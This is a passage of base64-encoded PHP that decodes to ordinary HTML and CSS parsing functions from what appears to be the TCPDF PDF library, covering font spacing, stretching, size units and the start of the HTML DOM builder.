dldEhUTUxVbml0VG9Vbml0cygkYm9yZGVyX3NwYWNpbmdbJ0gnXSwgJHdpZHRoLCAncHgnLCBmYWxzZSk7CgkJJGJvcmRlcl9zcGFjaW5nWydWJ10gPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRib3JkZXJfc3BhY2luZ1snViddLCAkd2lkdGgsICdweCcsIGZhbHNlKTsKCQlyZXR1cm4gJGJvcmRlcl9zcGFjaW5nOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgbGV0dGVyLXNwYWNpbmcgdmFsdWUgZnJvbSBDU1MgdmFsdWUKCSAqIEBwYXJhbSBzdHJpbmcgJHNwYWNpbmcgbGV0dGVyLXNwYWNpbmcgdmFsdWUKCSAqIEBwYXJhbSBmbG9hdCAkcGFyZW50IGZvbnQgc3BhY2luZyAodHJhY2tpbmcpIHZhbHVlIG9mIHRoZSBwYXJlbnQgZWxlbWVudAoJICogQHJldHVybiBmbG9hdCBxdWFudGl0eSB0byBpbmNyZWFzZXMgb3IgZGVjcmVhc2VzIHRoZSBzcGFjZSBiZXR3ZWVuIGNoYXJhY3RlcnMgaW4gYSB0ZXh0LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4wMDAgKDIwMTAtMTAtMDIpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBnZXRDU1NGb250U3BhY2luZygkc3BhY2luZywgJHBhcmVudD0wKSB7CgkJJHZhbCA9IDA7IC8vIHZhbHVlIHRvIGJlIHJldHVybmVkCgkJJHNwYWNpbmcgPSB0cmltKCRzcGFjaW5nKTsKCQlzd2l0Y2ggKCRzcGFjaW5nKSB7CgkJCWNhc2UgJ25vcm1hbCc6IHsKCQkJCSR2YWwgPSAwOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnaW5oZXJpdCc6IHsKCQkJCWlmICgkcGFyZW50ID09ICdub3JtYWwnKSB7CgkJCQkJJHZhbCA9IDA7CgkJCQl9IGVsc2UgewoJCQkJCSR2YWwgPSAkcGFyZW50OwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJZGVmYXVsdDogewoJCQkJJHZhbCA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHNwYWNpbmcsIDAsICdweCcsIGZhbHNlKTsKCQkJfQoJCX0KCQlyZXR1cm4gJHZhbDsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIHBlcmNlbnRhZ2Ugb2YgZm9udCBzdHJldGNoaW5nIGZyb20gQ1NTIHZhbHVlCgkgKiBAcGFyYW0gc3RyaW5nICRzdHJldGNoIHN0cmV0Y2ggbW9kZQoJICogQHBhcmFtIGZsb2F0ICRwYXJlbnQgc3RyZXRjaCB2YWx1ZSBvZiB0aGUgcGFyZW50IGVsZW1lbnQKCSAqIEByZXR1cm4gZmxvYXQgZm9udCBzdHJldGNoaW5nIHBlcmNlbnRhZ2UKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTEwLTAyKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0Q1NTRm9udFN0cmV0Y2hpbmcoJHN0cmV0Y2gsICRwYXJlbnQ9MTAwKSB7CgkJJHZhbCA9IDEwMDsgLy8gdmFsdWUgdG8gYmUgcmV0dXJuZWQKCQkkc3RyZXRjaCA9IHRyaW0oJHN0cmV0Y2gpOwoJCXN3aXRjaCAoJHN0cmV0Y2gpIHsKCQkJY2FzZSAndWx0cmEtY29uZGVuc2VkJzogewoJCQkJJHZhbCA9IDQwOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnZXh0cmEtY29uZGVuc2VkJzogewoJCQkJJHZhbCA9IDU1OwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnY29uZGVuc2VkJzogewoJCQkJJHZhbCA9IDcwOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnc2VtaS1jb25kZW5zZWQnOiB7CgkJCQkkdmFsID0gODU7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdub3JtYWwnOiB7CgkJCQkkdmFsID0gMTAwOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnc2VtaS1leHBhbmRlZCc6IHsKCQkJCSR2YWwgPSAxMTU7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdleHBhbmRlZCc6IHsKCQkJCSR2YWwgPSAxMzA7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdleHRyYS1leHBhbmRlZCc6IHsKCQkJCSR2YWwgPSAxNDU7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICd1bHRyYS1leHBhbmRlZCc6IHsKCQkJCSR2YWwgPSAxNjA7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICd3aWRlcic6IHsKCQkJCSR2YWwgPSAoJHBhcmVudCArIDEwKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ25hcnJvd2VyJzogewoJCQkJJHZhbCA9ICgkcGFyZW50IC0gMTApOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnaW5oZXJpdCc6IHsKCQkJCWlmICgkcGFyZW50ID09ICdub3JtYWwnKSB7CgkJCQkJJHZhbCA9IDEwMDsKCQkJCX0gZWxzZSB7CgkJCQkJJHZhbCA9ICRwYXJlbnQ7CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OiB7CgkJCQkkdmFsID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkc3RyZXRjaCwgMTAwLCAnJScsIGZhbHNlKTsKCQkJfQoJCX0KCQlyZXR1cm4gJHZhbDsKCX0KCgkvKioKCSAqIENvbnZlcnQgSFRNTCBzdHJpbmcgY29udGFpbmluZyBmb250IHNpemUgdmFsdWUgdG8gcG9pbnRzCgkgKiBAcGFyYW0gc3RyaW5nICR2YWwgU3RyaW5nIGNvbnRhaW5pbmcgZm9udCBzaXplIHZhbHVlIGFuZCB1bml0LgoJICogQHBhcmFtIGZsb2F0ICRyZWZzaXplIFJlZmVyZW5jZSBmb250IHNpemUgaW4gcG9pbnRzLgoJICogQHBhcmFtIGZsb2F0ICRwYXJlbnRfc2l6ZSBQYXJlbnQgZm9udCBzaXplIGluIHBvaW50cy4KCSAqIEBwYXJhbSBzdHJpbmcgJGRlZmF1bHR1bml0IERlZmF1bHQgdW5pdCAoY2FuIGJlIG9uZSBvZiB0aGUgZm9sbG93aW5nOiAlLCBlbSwgZXgsIHB4LCBpbiwgbW0sIHBjLCBwdCkuCgkgKiBAcmV0dXJuIGZsb2F0IHZhbHVlIGluIHBvaW50cwoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0SFRNTEZvbnRVbml0cygkdmFsLCAkcmVmc2l6ZT0xMiwgJHBhcmVudF9zaXplPTEyLCAkZGVmYXVsdHVuaXQ9J3B0JykgewoJCSRyZWZzaXplID0gVENQREZfRk9OVFM6OmdldEZvbnRSZWZTaXplKCRyZWZzaXplKTsKCQkkcGFyZW50X3NpemUgPSBUQ1BERl9GT05UUzo6Z2V0Rm9udFJlZlNpemUoJHBhcmVudF9zaXplLCAkcmVmc2l6ZSk7CgkJc3dpdGNoICgkdmFsKSB7CgkJCWNhc2UgJ3h4LXNtYWxsJzogewoJCQkJJHNpemUgPSAoJHJlZnNpemUgLSA0KTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3gtc21hbGwnOiB7CgkJCQkkc2l6ZSA9ICgkcmVmc2l6ZSAtIDMpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnc21hbGwnOiB7CgkJCQkkc2l6ZSA9ICgkcmVmc2l6ZSAtIDIpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnbWVkaXVtJzogewoJCQkJJHNpemUgPSAkcmVmc2l6ZTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2xhcmdlJzogewoJCQkJJHNpemUgPSAoJHJlZnNpemUgKyAyKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3gtbGFyZ2UnOiB7CgkJCQkkc2l6ZSA9ICgkcmVmc2l6ZSArIDQpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAneHgtbGFyZ2UnOiB7CgkJCQkkc2l6ZSA9ICgkcmVmc2l6ZSArIDYpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnc21hbGxlcic6IHsKCQkJCSRzaXplID0gKCRwYXJlbnRfc2l6ZSAtIDMpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnbGFyZ2VyJzogewoJCQkJJHNpemUgPSAoJHBhcmVudF9zaXplICsgMyk7CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OiB7CgkJCQkkcGFyZW50U2l6ZSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHBhcmVudF9zaXplLCAkcmVmc2l6ZSwgJGRlZmF1bHR1bml0LCB0cnVlKTsKCQkJCSRzaXplID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkdmFsLCAkcGFyZW50X3NpemUsICRkZWZhdWx0dW5pdCwgdHJ1ZSk7CgkJCX0KCQl9CgkJcmV0dXJuICRzaXplOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgSFRNTCBET00gYXJyYXkuCgkgKiBAcGFyYW0gc3RyaW5nICRodG1sIGh0bWwgY29kZQoJICogQHJldHVybiBhcnJheQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDMuMi4wMDAgKDIwMDgtMDYtMjApCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBnZXRIdG1sRG9tQXJyYXkoJGh0bWwpIHsKCQkvLyBzZXQgaW5oZXJpdGFibGUgcHJvcGVydGllcyBmb3QgdGhlIGZpcnN0IHZvaWQgZWxlbWVudAoJCS8vIHBvc3NpYmxlIGluaGVyaXRhYmxlIHByb3BlcnRpZXMgYXJlOiBhemltdXRoLCBib3JkZXItY29sbGFwc2UsIGJvcmRlci1zcGFjaW5nLCBjYXB0aW9uLXNpZGUsIGNvbG9yLCBjdXJzb3IsIGRpcmVjdGlvbiwgZW1wdHktY2VsbHMsIGZvbnQsIGZvbnQtZmFtaWx5LCBmb250LXN0cmV0Y2gsIGZvbnQtc2l6ZSwgZm9udC1zaXplLWFkanVzdCwgZm9udC1zdHlsZSwgZm9udC12YXJpYW50LCBmb250LXdlaWdodCwgbGV0dGVyLXNwYWNpbmcsIGxpbmUtaGVpZ2h0LCBsaXN0LXN0eWxlLCBsaXN0LXN0eWxlLWltYWdlLCBsaXN0LXN0eWxlLXBvc2l0aW9uLCBsaXN0LXN0eWxlLXR5cGUsIG9ycGhhbnMsIHBhZ2UsIHBhZ2UtYnJlYWstaW5zaWRlLCBxdW90ZXMsIHNwZWFrLCBzcGVhay1oZWFkZXIsIHRleHQtYWxpZ24sIHRleHQtaW5kZW50LCB0ZXh0LXRyYW5zZm9ybSwgdm9sdW1lLCB3aGl0ZS1zcGFjZSwgd2lkb3dzLCB3b3JkLXNwYWNpbmcKCQkkZG9tID0gYXJyYXkoCgkJCWFycmF5KAoJCQkJJ3RhZycgPT4gZmFsc2UsCgkJCQknYmxvY2snID0+IGZhbHNlLAoJCQkJJ3ZhbHVlJyA9PiAnJywKCQkJCSdwYXJlbnQnID0+IDAsCgkJCQknaGlkZScgPT4gZmFsc2UsCgkJCQknZm9udG5hbWUnID0+ICR0aGlzLT5Gb250RmFtaWx5LAoJCQkJJ2ZvbnRzdHlsZScgPT4gJHRoaXMtPkZvbnRTdHlsZSwKCQkJCSdmb250c2l6ZScgPT4gJHRoaXMtPkZvbnRTaXplUHQsCgkJCQknZm9udC1zdHJldGNoJyA9PiAkdGhpcy0+Zm9udF9zdHJldGNoaW5nLAoJCQkJJ2xldHRlci1zcGFjaW5nJyA9PiAkdGhpcy0+Zm9udF9zcGFjaW5nLAoJCQkJJ3N0cm9rZScgPT4gJHRoaXMtPnRleHRzdHJva2V3aWR0aCwKCQkJCSdmaWxsJyA9PiAoKCR0aGlzLT50ZXh0cmVuZGVybW9kZSAlIDIpID09IDApLAoJCQkJJ2NsaXAnID0+ICgkdGhpcy0+dGV4dHJlbmRlcm1vZGUgPiAzKSwKCQkJCSdsaW5lLWhlaWdodCcgPT4gJHRoaXMtPmNlbGxfaGVpZ2h0X3JhdGlvLAoJCQkJJ2JnY29sb3InID0+IGZhbHNlLAoJCQkJJ2ZnY29sb3InID0+ICR0aGlzLT5mZ2NvbG9yLCAvLyBjb2xvcgoJCQkJJ3N0cm9rZWNvbG9yJyA9PiAkdGhpcy0+c3Ryb2tlY29sb3IsCgkJCQknYWxpZ24nID0+ICcnLAoJCQkJJ2xpc3R0eXBlJyA9PiAnJywKCQkJCSd0ZXh0LWluZGVudCcgPT4gMCwKCQkJCSd0ZXh0LXRyYW5zZm9ybScgPT4gJycsCgkJCQknYm9yZGVyJyA9PiBhcnJheSgpLAoJCQkJJ2RpcicgPT4gJHRoaXMtPnJ0bD8ncnRsJzonbHRyJywKCQkJCSd3aWR0aCcgPT4gMCwKCQkJCSdoZWlnaHQnID0+IDAsCgkJCQkneCcgPT4gMCwKCQkJCSd5JyA9PiAwLAoJCQkJJ3cnID0+IDAsCgkJCQknaCcgPT4gMCwKCQkJCSdsJyA9PiAwLAoJCQkJJ3QnID0+IDAsCgkJCQkncicgPT4gMCwKCQkJCSdiJyA9PiAwLAoJCQkJJ3BhZGRpbmcnID0+IGFycmF5KCdUJyA9PiAwLCAnUicgPT4gMCwgJ0InID0+IDAsICdMJyA9PiAwKSwKCQkJCSdtYXJnaW4nID0+IGFycmF5KCdUJyA9PiAwLCAnUicgPT4gMCwgJ0InID0+IDAsICdMJyA9PiAwKSwKCQkJCSdib3JkZXItc3BhY2luZycgPT4gYXJyYXkoJ0gnID0+IDAsICdWJyA9PiAwKSwKCQkJCSdib3JkZXItY29sbGFwc2UnID0+ICdzZXBhcmF0ZScsCgkJCSkKCQkpOwoKCQlpZigkaHRtbCA9PT0gJycgfHwgJGh0bWwgPT09IG51bGwpIHsKCQkJcmV0dXJuICRkb207CgkJfQoJCS8vIGFycmF5IG9mIENTUyBzdHlsZXMgKCBzZWxlY3RvciA9PiBwcm9wZXJ0aWVzKS4KCQkkY3NzID0gYXJyYXkoKTsKCQkvLyBnZXQgQ1NTIGFycmF5IGRlZmluZWQgYXQgcHJldmlvdXMgY2FsbAoJCSRtYXRjaGVzID0gYXJyYXkoKTsKCQlpZiAocHJlZ19tYXRjaF9hbGwoJy88Y3NzYXJyYXk+KFteXDxdKj8pPFwvY3NzYXJyYXk+L2lzJywgJGh0bWwsICRtYXRjaGVzKSA+IDApIHsKCQkJaWYgKGlzc2V0KCRtYXRjaGVzWzFdWzBdKSkgewoJCQkJJGNzcyA9IGFycmF5X21lcmdlKCRjc3MsIGpzb25fZGVjb2RlKCR0aGlzLT51bmh0bWxlbnRpdGllcygkbWF0Y2hlc1sxXVswXSksIHRydWUpKTsKCQkJfQoJCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnLzxjc3NhcnJheT4oLio/KTxcL2Nzc2FycmF5Pi9pcycsICcnLCAkaHRtbCk7CgkJfQoJCS8vIGV4dHJhY3QgZXh0ZXJuYWwgQ1NTIGZpbGVzCgkJJG1hdGNoZXMgPSBhcnJheSgpOwoJCWlmIChwcmVnX21hdGNoX2FsbCgnLzxsaW5rKFteXD5dKj8pPi9pcycsICRodG1sLCAkbWF0Y2hlcykgPiAwKSB7CgkJCWZvcmVhY2ggKCRtYXRjaGVzWzFdIGFzICRrZXkgPT4gJGxpbmspIHsKCQkJCSR0eXBlID0gYXJyYXkoKTsKCQkJCWlmIChwcmVnX21hdGNoKCcvdHlwZVtcc10qPVtcc10qInRleHRcL2NzcyIvJywgJGxpbmssICR0eXBlKSkgewoJCQkJCSR0eXBlID0gYXJyYXkoKTsKCQkJCQlwcmVnX21hdGNoKCcvbWVkaWFbXHNdKj1bXHNdKiIoW14iXSopIi8nLCAkbGluaywgJHR5cGUpOwoJCQkJCS8vIGdldCAnYWxsJyBhbmQgJ3ByaW50JyBtZWRpYSwgb3RoZXIgbWVkaWEgdHlwZXMgYXJlIGRpc2NhcmRlZAoJCQkJCS8vIChhbGwsIGJyYWlsbGUsIGVtYm9zc2VkLCBoYW5kaGVsZCwgcHJpbnQsIHByb2plY3Rpb24sIHNjcmVlbiwgc3BlZWNoLCB0dHksIHR2KQoJCQkJCWlmIChlbXB0eSgkdHlwZSkgT1IgKGlzc2V0KCR0eXBlWzFdKSBBTkQgKCgkdHlwZVsxXSA9PSAnYWxsJykgT1IgKCR0eXBlWzFdID09ICdwcmludCcpKSkpIHsKCQkJCQkJJHR5cGUgPSBhcnJheSgpOwoJCQkJCQlpZiAocHJlZ19tYXRjaCgnL2hyZWZbXHNdKj1bXHNdKiIoW14iXSopIi8nLCAkbGluaywgJHR5cGUpID4gMCkgewoJCQkJCQkJLy8gcmVhZCBDU1MgZGF0YSBmaWxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY3NzZGF0YSA9ICR0aGlzLT5nZXRDYWNoZWRGaWxlQ29udGVudHModHJpbSgkdHlwZVsxXSkpOwoJCQkJCQkJaWYgKCgkY3NzZGF0YSAhPT0gRkFMU0UpIEFORCAoc3RybGVuKCRjc3NkYXRhKSA+IDApKSB7CgkJCQkJCQkJJGNzcyA9IGFycmF5X21lcmdlKCRjc3MsIFRDUERGX1NUQVRJQzo6ZXh0cmFjdENTU3Byb3BlcnRpZXMoJGNzc2RhdGEpKTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCQkvLyBleHRyYWN0IHN0eWxlIHRhZ3MKCQkkbWF0Y2hlcyA9IGFycmF5KCk7CgkJaWYgKHByZWdfbWF0Y2hfYWxsKCcvPHN0eWxlKFteXD5dKj8pPihbXlw8XSo/KTxcL3N0eWxlPi9pcycsICRodG1sLCAkbWF0Y2hlcykgPiAwKSB7CgkJCWZvcmVhY2ggKCRtYXRjaGVzWzFdIGFzICRrZXkgPT4gJG1lZGlhKSB7CgkJCQkkdHlwZSA9IGFycmF5KCk7CgkJCQlwcmVnX21hdGNoKCcvbWVkaWFbXHNdKj1bXHNdKiIoW14iXSopIi8nLCAkbWVkaWEsICR0eXBlKTsKCQkJCS8vIGdldCAnYWxsJyBhbmQgJ3ByaW50JyBtZWRpYSwgb3RoZXIgbWVkaWEgdHlwZXMgYXJlIGRpc2NhcmRlZAoJCQkJLy8gKGFsbCwgYnJhaWxsZSwgZW1ib3NzZWQsIGhhbmRoZWxkLCBwcmludCwgcHJvamVjdGlvbiwgc2NyZWVuLCBzcGVlY2gsIHR0eSwgdHYpCgkJCQlpZiAoZW1wdHkoJHR5cGUpIE9SIChpc3NldCgkdHlwZVsxXSkgQU5EICgoJHR5cGVbMV0gPT0gJ2FsbCcpIE9SICgkdHlwZVsxXSA9PSAncHJpbnQnKSkpKSB7CgkJCQkJJGNzc2RhdGEgPSAkbWF0Y2hlc1syXVska2V5XTsKCQkJCQkkY3NzID0gYXJyYXlfbWVyZ2UoJGNzcywgVENQREZfU1RBVElDOjpleHRyYWN0Q1NTcHJvcGVydGllcygkY3NzZGF0YSkpOwoJCQkJfQoJCQl9CgkJfQoJCS8vIGNyZWF0ZSBhIHNwZWNpYWwgdGFnIHRvIGNvbnRhaW4gdGhlIENTUyBhcnJheSAodXNlZCBmb3IgdGFibGUgY29udGVudCkKCQkkY3NzdGFnYXJyYXkgPSAnPGNzc2FycmF5PicuaHRtbGVudGl0aWVzKGpzb25fZW5jb2RlKCRjc3MpKS4nPC9jc3NhcnJheT4nOwoJCS8vIHJlbW92ZSBoZWFkIGFuZCBzdHlsZSBibG9ja3MKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnLzxoZWFkKFteXD5dKj8pPiguKj8pPFwvaGVhZD4vaXMnLCAnJywgJGh0bWwpOwoJCSRodG1sID0gcHJlZ19yZXBsYWNlKCcvPHN0eWxlKFteXD5dKj8pPihbXlw8XSo/KTxcL3N0eWxlPi9pcycsICcnLCAkaHRtbCk7CgkJLy8gZGVmaW5lIGJsb2NrIHRhZ3MKCQkkYmxvY2t0YWdzID0gYXJyYXkoJ2Jsb2NrcXVvdGUnLCdicicsJ2RkJywnZGwnLCdkaXYnLCdkdCcsJ2gxJywnaDInLCdoMycsJ2g0JywnaDUnLCdoNicsJ2hyJywnbGknLCdvbCcsJ3AnLCdwcmUnLCd1bCcsJ3RjcGRmJywndGFibGUnLCd0cicsJ3RkJyk7CgkJLy8gZGVmaW5lIHNlbGYtY2xvc2luZyB0YWdzCgkJJHNlbGZjbG9zaW5ndGFncyA9IGFycmF5KCdhcmVhJywnYmFzZScsJ2Jhc2Vmb250JywnYnInLCdocicsJ2lucHV0JywnaW1nJywnbGluaycsJ21ldGEnKTsKCQkvLyByZW1vdmUgYWxsIHVuc3VwcG9ydGVkIHRhZ3MgKHRoZSBsaW5lIGJlbG93IGxpc3RzIGFsbCBzdXBwb3J0ZWQgdGFncykKCQkkaHRtbCA9IHN0cmlwX3RhZ3MoJGh0bWwsICc8bWFya2VyLz48YT48Yj48YmxvY2txdW90ZT48Ym9keT48YnI+PGJyLz48ZGQ+PGRlbD48ZGl2PjxkbD48ZHQ+PGVtPjxmb250Pjxmb3JtPjxoMT48aDI+PGgzPjxoND48aDU+PGg2Pjxocj48aHIvPjxpPjxpbWc+PGlucHV0PjxsYWJlbD48bGk+PG9sPjxvcHRpb24+PHA+PHByZT48cz48c2VsZWN0PjxzbWFsbD48c3Bhbj48c3RyaWtlPjxzdHJvbmc+PHN1Yj48c3VwPjx0YWJsZT48dGFibGVoZWFkPjx0Y3BkZj48dGQ+PHRleHRhcmVhPjx0aD48dGhlYWQ+PHRyPjx0dD48dT48dWw+Jyk7CgkJLy9yZXBsYWNlIHNvbWUgYmxhbmsgY2hhcmFjdGVycwoJCSRodG1sID0gcHJlZ19yZXBsYWNlKCcvPHByZS8nLCAnPHhyZScsICRodG1sKTsgLy8gcHJlc2VydmUgcHJlIHRhZwoJCSRodG1sID0gcHJlZ19yZXBsYWNlKCcvPCh0YWJsZXx0cnx0ZHx0aHx0Y3BkZnxibG9ja3F1b3RlfGRkfGRpdnxkbHxkdHxmb3JtfGgxfGgyfGgzfGg0fGg1fGg2fGJyfGhyfGxpfG9sfHVsfHApKFteXD5dKik+W1xuXHJcdF0rLycsICc8XFwxXFwyPicsICRodG1sKTsKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnQChcclxufFxyKUAnLCAiXG4iLCAkaHRtbCk7CgkJJHJlcFRhYmxlID0gYXJyYXkoIlx0IiA9PiAnICcsICJcMCIgPT4gJyAnLCAiXHgwQiIgPT4gJyAnLCAiXFwiID0+ICJcXFxcIik7CgkJJGh0bWwgPSBzdHJ0cigkaHRtbCwgJHJlcFRhYmxlKTsKCQkkb2Zmc2V0ID0gMDsKCQl3aGlsZSAoKCRvZmZzZXQgPCBzdHJsZW4oJGh0bWwpKSBBTkQgKCRwb3MgPSBzdHJwb3MoJGh0bWwsICc8L3ByZT4nLCAkb2Zmc2V0KSkgIT09IGZhbHNlKSB7CgkJCSRodG1sX2EgPSBzdWJzdHIoJGh0bWwsIDAsICRvZmZzZXQpOwoJCQkkaHRtbF9iID0gc3Vic3RyKCRodG1sLCAkb2Zmc2V0LCAoJHBvcyAtICRvZmZzZXQgKyA2KSk7CgkJCXdoaWxlIChwcmVnX21hdGNoKCInPHhyZShbXlw+XSopPiguKj8pXG4oLio/KTwvcHJlPidzaSIsICRodG1sX2IpKSB7CgkJCQkvLyBwcmVzZXJ2ZSBuZXdsaW5lcyBvbiA8cHJlPiB0YWcKCQkJCSRodG1sX2IgPSBwcmVnX3JlcGxhY2UoIic8eHJlKFteXD5dKik+KC4qPylcbiguKj8pPC9wcmU+J3NpIiwgIjx4cmVcXDE+XFwyPGJyIC8+XFwzPC9wcmU+IiwgJGh0bWxfYik7CgkJCX0KCQkJd2hpbGUgKHByZWdfbWF0Y2goIic8eHJlKFteXD5dKik+KC4qPykiLiR0aGlzLT5yZV9zcGFjZVsncCddLiIoLio/KTwvcHJlPiciLiR0aGlzLT5yZV9zcGFjZVsnbSddLCAkaHRtbF9iKSkgewoJCQkJLy8gcHJlc2VydmUgc3BhY2VzIG9uIDxwcmU+IHRhZwoJCQkJJGh0bWxfYiA9IHByZWdfcmVwbGFjZSgiJzx4cmUoW15cPl0qKT4oLio/KSIuJHRoaXMtPnJlX3NwYWNlWydwJ10uIiguKj8pPC9wcmU+JyIuJHRoaXMtPnJlX3NwYWNlWydtJ10sICI8eHJlXFwxPlxcMiZuYnNwO1xcMzwvcHJlPiIsICRodG1sX2IpOwoJCQl9CgkJCSRodG1sID0gJGh0bWxfYS4kaHRtbF9iLnN1YnN0cigkaHRtbCwgJHBvcyArIDYpOwoJCQkkb2Zmc2V0ID0gc3RybGVuKCRodG1sX2EuJGh0bWxfYik7CgkJfQoJCSRvZmZzZXQgPSAwOwoJCXdoaWxlICgoJG9mZnNldCA8IHN0cmxlbigkaHRtbCkpIEFORCAoJHBvcyA9IHN0cnBvcygkaHRtbCwgJzwvdGV4dGFyZWE+JywgJG9mZnNldCkpICE9PSBmYWxzZSkgewoJCQkkaHRtbF9hID0gc3Vic3RyKCRodG1sLCAwLCAkb2Zmc2V0KTsKCQkJJGh0bWxfYiA9IHN1YnN0cigkaHRtbCwgJG9mZnNldCwgKCRwb3MgLSAkb2Zmc2V0ICsgMTEpKTsKCQkJd2hpbGUgKHByZWdfbWF0Y2goIic8dGV4dGFyZWEoW15cPl0qKT4oLio/KVxuKC4qPyk8L3RleHRhcmVhPidzaSIsICRodG1sX2IpKSB7CgkJCQkvLyBwcmVzZXJ2ZSBuZXdsaW5lcyBvbiA8dGV4dGFyZWE+IHRhZwoJCQkJJGh0bWxfYiA9IHByZWdfcmVwbGFjZSgiJzx0ZXh0YXJlYShbXlw+XSopPiguKj8pXG4oLio/KTwvdGV4dGFyZWE+J3NpIiwgIjx0ZXh0YXJlYVxcMT5cXDI8VEJSPlxcMzwvdGV4dGFyZWE+IiwgJGh0bWxfYik7CgkJCQkkaHRtbF9iID0gcHJlZ19yZXBsYWNlKCInPHRleHRhcmVhKFteXD5dKik+KC4qPylbXCJdKC4qPyk8L3RleHRhcmVhPidzaSIsICI8dGV4dGFyZWFcXDE+XFwyJydcXDM8L3RleHRhcmVhPiIsICRodG1sX2IpOwoJCQl9CgkJCSRodG1sID0gJGh0bWxfYS4kaHRtbF9iLnN1YnN0cigkaHRtbCwgJHBvcyArIDExKTsKCQkJJG9mZnNldCA9IHN0cmxlbigkaHRtbF9hLiRodG1sX2IpOwoJCX0KCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnLyhbXHNdKik8b3B0aW9uL3NpJywgJzxvcHRpb24nLCAkaHRtbCk7CgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy88XC9vcHRpb24+KFtcc10qKS9zaScsICc8L29wdGlvbj4nLCAkaHRtbCk7CgkJJG9mZnNldCA9IDA7CgkJd2hpbGUgKCgkb2Zmc2V0IDwgc3RybGVuKCRodG1sKSkgQU5EICgkcG9zID0gc3RycG9zKCRodG1sLCAnPC9vcHRpb24+JywgJG9mZnNldCkpICE9PSBmYWxzZSkgewoJCQkkaHRtbF9hID0gc3Vic3RyKCRodG1sLCAwLCAkb2Zmc2V0KTsKCQkJJGh0bWxfYiA9IHN1YnN0cigkaHRtbCwgJG9mZnNldCwgKCRwb3MgLSAkb2Zmc2V0ICsgOSkpOwoJCQl3aGlsZSAocHJlZ19tYXRjaCgiJzxvcHRpb24oW15cPl0qKT4oLio/KTwvb3B0aW9uPidzaSIsICRodG1sX2IpKSB7CgkJCQkkaHRtbF9iID0gcHJlZ19yZXBsYWNlKCInPG9wdGlvbihbXHNdKyl2YWx1ZT1cIihbXlwiXSopXCIoW15cPl0qKT4oLio/KTwvb3B0aW9uPidzaSIsICJcXDIjIVRhQiEjXFw0IyFOd0whIyIsICRodG1sX2IpOwoJCQkJJGh0bWxfYiA9IHByZWdfcmVwbGFjZSgiJzxvcHRpb24oW15cPl0qKT4oLio/KTwvb3B0aW9uPidzaSIsICJcXDIjIU53TCEjIiwgJGh0bWxfYik7CgkJCX0KCQkJJGh0bWwgPSAkaHRtbF9hLiRodG1sX2Iuc3Vic3RyKCRodG1sLCAkcG9zICsgOSk7CgkJCSRvZmZzZXQgPSBzdHJsZW4oJGh0bWxfYS4kaHRtbF9iKTsKCQl9CgkJaWYgKHByZWdfbWF0Y2goIic8L3NlbGVjdCdzaSIsICRodG1sKSkgewoJCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgiJzxzZWxlY3QoW15cPl0qKT4nc2kiLCAiPHNlbGVjdFxcMSBvcHQ9XCIiLCAkaHRtbCk7CgkJCSRodG1sID0gcHJlZ19yZXBsYWNlKCInIyFOd0whIzwvc2VsZWN0PidzaSIsICJcIiAvPiIsICRodG1sKTsKCQl9CgkJJGh0bWwgPSBzdHJfcmVwbGFjZSgiXG4iLCAnICcsICRodG1sKTsKCQkvLyByZXN0b3JlIHRleHRhcmVhIG5ld2xpbmVzCgkJJGh0bWwgPSBzdHJfcmVwbGFjZSgnPFRCUj4nLCAiXG4iLCAkaHRtbCk7CgkJLy8gcmVtb3ZlIGV4dHJhIHNwYWNlcyBmcm9tIGNvZGUKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnL1tcc10rPFwvKHRhYmxlfHRyfHVsfG9sfGRsKT4vJywgJzwvXFwxPicsICRodG1sKTsKCQkkaHRtbCA